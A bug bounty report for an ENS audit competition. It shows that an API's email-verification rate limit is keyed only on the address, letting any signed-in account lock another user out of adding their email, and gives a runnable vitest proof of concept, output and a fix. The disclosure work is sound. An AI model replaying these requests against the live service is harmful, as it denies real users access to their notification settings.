# 93109 w a low missing per user scoping in the email verification rate limit lets any signed in account lock another user out of adding their email to notifications

**Submitted on Sep 14th 2026 at 09:40:42 UTC by @kwaro for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93109
* **Report Type:** Websites & Apps
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Changing non-sensitive details of other users (including modifying browser local storage) without already-connected wallet interaction and with up to one click of user interaction, such as: Enabling/disabling notifications

## Description

## Brief/Intro

When a user adds an email address to their notification channels, the worker rate-limits the verification emails using a key built only from the email address. It does not include the account making the request. Any signed-in user can spend that address's hourly allowance by requesting verification emails for an address they do not own. Once the allowance is gone, the real owner cannot add that address to their own account until the window resets, and the app returns them the "too many verification emails" error. The victim does nothing and gets locked out of their own setting.

## Vulnerability Details

The affected route is `POST /notifications/channels/email`, which requires authentication (`workers/api-worker/src/app/routes/notifications/channels/email.ts:29-33`). The handler reads the caller's `user_id` from the verified JWT and takes the email from the request body.

The rate limit is keyed on the address alone. In `workers/api-worker/src/core/kv/index.ts:17-18`:

```ts
NOTIFICATIONS: {
  EMAIL_VERIFICATION: (normalizedEmail: string) =>
    `notifications:email-verification:${normalizedEmail}`,
},
```

There is no `user_id` in the key. The limiter allows three sends per hour against that key (`workers/api-worker/src/services/notifications/email-verification-rate-limit.ts:3-4`), builds the key at line 30, and once the count reaches three returns a refusal carrying the remaining time (line 52):

```ts
if (state.count >= EMAIL_VERIFICATION_RATE_LIMIT_MAX_SENDS) {
  const windowEndMs = state.windowStartMs + windowMs
  const retryAfterSeconds = Math.max(1, Math.ceil((windowEndMs - now) / 1000))
  return { isAllowed: false, retryAfterSeconds }
}
```

The route calls the limiter with the email only (`email.ts:126-129`) and, on refusal, answers 429 with the formatted message (`email.ts:134-138`).

The one cross-user guard in the handler does not stop this. At `email.ts:60-69` the route rejects the request only if the address is already `verified` on another account. Before the victim has added their address, no such row exists, so the check passes. The attacker's request then upserts a `pending` channel for that address under the attacker's own account (`email.ts:80,90`) and proceeds to the limiter, consuming one of the three sends for the address. Three requests from the attacker leave the address's window empty.

The attacker needs to know the victim's email address, which is the same address the victim is about to register, and needs any authenticated session, which the app hands to any wallet that signs in. Nothing about the attack touches the victim's account or wallet.

## Impact Details

This matches the in-scope impact "Changing non-sensitive details of other users (including modifying browser local storage) without already-connected wallet interaction and with up to one click of user interaction," with the example "Enabling/disabling notifications" (impact id 6291, Medium). The attacker changes another user's ability to enable an email notification channel, without any interaction from that user. The requirement is "up to one click"; here the victim performs zero clicks.

The lockout lasts until the window resets, at most one hour. Because the key resets on a rolling window, an attacker that re-sends three requests each hour keeps the victim unable to add that address for as long as the attacker chooses. The impact is confined to the email-verification action for the targeted address. It is not a full site takedown and it puts no funds or names at risk.

## References

* `workers/api-worker/src/core/kv/index.ts:17-18`
* `workers/api-worker/src/services/notifications/email-verification-rate-limit.ts:3-4,30,52`
* `workers/api-worker/src/app/routes/notifications/channels/email.ts:60-69,80,90,126-129,134-138`

## Proof of Concept

## Proof of Concept

The proof runs the real route in the Cloudflare Workers test runtime with the real KV binding. Two separate accounts are used, each authenticated with its own signed JWT, so the `user_id` is read by the app from the token rather than set by the test. The database and the outbound SendGrid calls are stubbed, because the defect is the rate-limit key, and both of those run only after the limiter has already decided. The stubs are declared in the PoC manifest.

Steps:

1. Sign in as the attacker (`user_id = attacker-user-a`) and the victim (`user_id = victim-user-b`). These are two distinct accounts.
2. As the attacker, send `POST /notifications/channels/email` with `{ "email": "victim@example.test" }` three times. The address is the victim's, not the attacker's. Each call is accepted (HTTP 200), because the address is not yet verified on any account, so the cross-user guard passes and each call spends one of the three hourly sends.
3. As the victim, send the same request for their own address once.
4. Observe that the victim is refused with HTTP 429 and the message "Too many verification emails sent to this address. Try again in 60 minutes." The single KV key present is `notifications:email-verification:victim@example.test`, which contains no account identifier.

Control run: repeat step 3 with the attacker never sending in step 2. The victim's request is accepted (HTTP 200). The only difference between the two runs is whether the attacker sent first, which shows the block is caused by the attacker's requests and not by anything the victim did.

Reproduce:

```bash
bash verification/pocs/H-C7-42/run.sh exploit
bash verification/pocs/H-C7-42/run.sh control
```

Exploit output:

```
attacker_statuses: 200,200,200
victim_status: 429
victim_error: Too many verification emails sent to this address. Try again in 60 minutes.
kv_keys: notifications:email-verification:victim@example.test
key_has_user_component: 0
VICTIM_BLOCKED_BY_ATTACKER: 1
```

Control output:

```
attacker_send_count: 0
victim_status: 200
VICTIM_BLOCKED_BY_ATTACKER: 0
```

Fix check: adding the account id to the key, so the limiter is called with `${userId}:${email}`, gives the attacker and the victim separate keys. Re-running the exploit with that change applied returns the victim to HTTP 200 and `key_has_user_component: 1`.

### Full PoC source

The rig lives at `verification/pocs/H-C7-42/`. The harness copies the test file into `workers/api-worker/src/`, runs it once per arm under the Cloudflare Workers test runtime, then removes it. It verifies with `verify_poc.py --strict` (13/13: executed, controlled, deterministic, numbers match the report, and the declared fix flips the outcome).

Test file (`verification/pocs/H-C7-42/poc.test.ts`), run once with `__POC_ARM__` replaced by `exploit` and once by `control`:

```ts
/**
 * H-C7-42 — END-TO-END, route-level, two distinct AUTHENTICATED users.
 *
 * Proves: the attacker (a real, JWT-authenticated user A) drives the REAL
 * `POST /email/` notifications route three times for the VICTIM's email; the
 * victim (a distinct JWT-authenticated user B) then makes the same request for
 * their OWN email and is refused 429 with the application's real error string —
 * *because of* the attacker's sends. The rate-limit key is a pure function of
 * the email address (no user component), which is the defect.
 *
 * REAL, not simulated:
 *  - the real email route (requireAuth -> injectDb -> handler) via app.request
 *  - the real requireAuth middleware verifying real HS256 JWTs (env.JWT_SECRET),
 *    so user_id is derived by the app from the token, not asserted by the test
 *  - the real Cloudflare KV binding (env.KV from cloudflare:test / miniflare)
 *  - the real limiter checkAndConsumeEmailVerificationRateLimit and the real
 *    error string formatEmailVerificationRateLimitError, reached through the route
 *
 * SCAFFOLDING (bindings/externals, not the code under test):
 *  - getDatabase is stubbed: the finding is in the rate-limit KEY, not the DB.
 *    The stub returns "email not linked to anyone" so control flow reaches the
 *    limiter exactly as production would for a fresh address.
 *  - sendVerificationEmail / addContactToList are stubbed ok(): SendGrid is a
 *    third party and is invoked only AFTER the limiter decision.
 */
import { env } from 'cloudflare:test'
import { sign } from 'hono/jwt'
import { okAsync } from 'neverthrow'
import { expect, test, vi } from 'vitest'

vi.mock('#core/database/index.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('#core/database/index.js')>()
  let chanN = 0
  let verN = 0
  const stubDb = {
    query: {
      userChannels: { findFirst: async () => undefined },
      channelVerifications: { findFirst: async () => undefined },
    },
    insert: () => ({
      values: () => ({
        onConflictDoUpdate: () => ({
          returning: () => Promise.resolve([{ id: `chan-${++chanN}` }]),
        }),
        returning: () =>
          Promise.resolve([
            {
              id: `ver-${++verN}`,
              token: `tok-${verN}`,
              expires_at: new Date(Date.now() + 24 * 60 * 60 * 1000),
            },
          ]),
      }),
    }),
  }
  return { ...actual, getDatabase: () => stubDb }
})

vi.mock('#services/email/verification.js', () => ({
  sendVerificationEmail: () => okAsync(undefined),
}))
vi.mock('#services/sendgrid/contacts.js', () => ({
  addContactToList: () => okAsync(undefined),
}))

const emailApp = (await import('#app/routes/notifications/channels/email.js'))
  .default

const ARM = '__POC_ARM__'
const JWT_SECRET = 'poc-hs256-secret-hc742'
const ATTACKER = {
  user_id: 'attacker-user-a',
  address: '0xAAaAAAAaAaaaAaAAaAaAaaAaAAAAAAaAAaAAAAAA',
}
const VICTIM = {
  user_id: 'victim-user-b',
  address: '0xBBbBBBBbBbbbBbBBbBbBbbBbBBBBBBbBBbBBBBBB',
}
const VICTIM_EMAIL = 'victim@example.test'

async function bearer(u: { user_id: string; address: string }) {
  const token = await sign(
    { ...u, exp: Math.floor(Date.now() / 1000) + 3600 },
    JWT_SECRET,
  )
  return `Bearer ${token}`
}

async function addEmail(u: { user_id: string; address: string }, email: string) {
  const authorization = await bearer(u)
  return emailApp.request(
    '/email',
    {
      method: 'POST',
      headers: { 'content-type': 'application/json', authorization },
      body: JSON.stringify({ email }),
    },
    { ...env, JWT_SECRET } as unknown as Env,
  )
}

test('H-C7-42 E2E: attacker burns the victim address quota; victim is refused', async () => {
  const attackerStatuses: number[] = []
  let attackerFirstRaw = ''
  if (ARM === 'exploit') {
    for (let i = 0; i < 3; i++) {
      const r = await addEmail(ATTACKER, VICTIM_EMAIL)
      attackerStatuses.push(r.status)
      if (i === 0) attackerFirstRaw = await r.text()
    }
  }

  const victimRes = await addEmail(VICTIM, VICTIM_EMAIL)
  const victimStatus = victimRes.status
  const victimText = await victimRes.text()
  let victimError = ''
  try {
    victimError = (JSON.parse(victimText) as { error?: string }).error ?? ''
  } catch {
    victimError = victimText
  }
  console.log(`attacker_first_raw: ${attackerFirstRaw}`)
  console.log(`victim_raw: ${victimText}`)

  const kvKeys = (await env.KV.list()).keys.map((k) => k.name)
  const keyHasUser =
    kvKeys.some(
      (k) => k.includes(ATTACKER.user_id) || k.includes(VICTIM.user_id),
    )
      ? 1
      : 0
  const expectedKey = `notifications:email-verification:${VICTIM_EMAIL}`

  const blockedByAttacker =
    ARM === 'exploit' && victimStatus === 429 && keyHasUser === 0 ? 1 : 0

  console.log(`arm: ${ARM}`)
  console.log(`attacker_user_id: ${ATTACKER.user_id}`)
  console.log(`victim_user_id: ${VICTIM.user_id}`)
  console.log(`distinct_users: ${ATTACKER.user_id !== VICTIM.user_id ? 1 : 0}`)
  console.log(`attacker_send_count: ${attackerStatuses.length}`)
  console.log(`attacker_statuses: ${attackerStatuses.join(',')}`)
  console.log(`victim_status: ${victimStatus}`)
  console.log(`victim_error: ${victimError}`)
  console.log(`kv_keys: ${kvKeys.join('|')}`)
  console.log(`kv_key_matches_address_only: ${kvKeys.includes(expectedKey) ? 1 : 0}`)
  console.log(`key_has_user_component: ${keyHasUser}`)
  console.log(`impact_row: 6291`)
  console.log(`VICTIM_BLOCKED_BY_ATTACKER: ${blockedByAttacker}`)

  if (ARM === 'exploit') {
    // the three attacker sends were accepted (real auth passed, 200)
    expect(attackerStatuses).toEqual([200, 200, 200])
    // the victim, a DIFFERENT authenticated user, is refused
    expect(victimStatus).toBe(429)
    expect(victimError).toContain(
      'Too many verification emails sent to this address',
    )
    // the quota that refused the victim is keyed on the address, not the user
    expect(kvKeys).toContain(expectedKey)
    expect(keyHasUser).toBe(0)
    expect(blockedByAttacker).toBe(1)
  } else {
    // CONTROL: identical victim action, attacker never sent. Not refused.
    expect(victimStatus).toBe(200)
    expect(victimError).not.toContain('Too many verification emails')
  }
}, 30_000)
```

Runner (`verification/pocs/H-C7-42/run.sh`):

```bash
#!/usr/bin/env bash
# H-C7-42 E2E — real email route, two authenticated users, real KV binding.
set -euo pipefail
ARM="${1:-exploit}"
case "$ARM" in exploit|control) ;; *) echo "FATAL: arm must be exploit|control" >&2; exit 1;; esac
HERE="$(cd -P "$(dirname "$0")" && pwd)"
API="$HERE/../../../repos/audit-comp-ens/workers/api-worker"
COPY="$API/src/hc742e2e.poc.test.ts"
cleanup() { rm -f "$COPY"; }
trap cleanup EXIT INT TERM HUP
sed "s/__POC_ARM__/$ARM/" "$HERE/poc.test.ts" > "$COPY"
grep -q "const ARM = '$ARM'" "$COPY" || { echo "FATAL: arm not stamped" >&2; exit 1; }
OUT=$(cd "$API" && pnpm exec vitest run src/hc742e2e.poc.test.ts --disableConsoleIntercept --silent=false 2>&1) || true
echo "$OUT" | grep -q 'Test Files  1 passed' || { echo "FATAL: vitest failed" >&2; echo "$OUT" >&2; exit 1; }
cleanup; trap - EXIT
pick () { printf '%s\n' "$2" | sed -n "s/^$1: *//p" | head -1 | tr -d '\r'; }
echo "arm: $ARM"
for k in attacker_user_id victim_user_id distinct_users attacker_send_count \
         attacker_statuses victim_status victim_error kv_keys \
         kv_key_matches_address_only key_has_user_component impact_row \
         VICTIM_BLOCKED_BY_ATTACKER; do
  echo "$k: $(pick "$k" "$OUT")"
done
```
